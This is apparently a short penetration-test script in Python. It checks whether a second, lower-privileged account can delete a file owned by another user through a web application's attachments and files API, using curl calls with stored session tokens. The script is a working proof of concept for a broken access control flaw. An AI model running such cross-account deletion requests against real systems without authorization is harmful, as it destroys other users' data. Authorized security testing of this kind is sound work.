import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TR2b=open('/tmp/tok_R2-65').read().strip()
TB=open('/tmp/tok_B-230').read().strip()
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','90','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or TR2b),'-H',BB,'-H','Content-Type: application/json']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='zx'+uuid.uuid4().hex[:8]
print("=== second role-2 account (65) vs Owner file ===")
c,b=req('POST','/api/v1/attachments/html',
        {"html":f"<h1>ZX-R2B-{tag}</h1>","type":"word",
         "attachableType":"AuditableEntity","attachableId":"99","fileName":f"zx-{tag}-R2B"},tok=TB)
if c!='200': raise SystemExit(f"gen failed {c}")
aid=json.loads(b)['attachmentId']
c,b=req('GET',f'/api/v1/attachments/{aid}',tok=TB)
fid=json.loads(b)['attachments'][0]['file_id']
print(f"  victim file_id={fid} (owner 230)")
c,_=req('GET',f'/api/v1/files/{fid}',tok=TB); print(f"  B control GET -> {c}")
c,b=req('DELETE',f'/api/v1/files/{fid}',tok=TR2b)
print(f"  R2(65) DELETE -> {c} {b[:120].replace(chr(10),' ')}")
c,b=req('GET',f'/api/v1/files/{fid}',tok=TB)
print(f"  B after -> {c} {b[:130].replace(chr(10),' ')}")
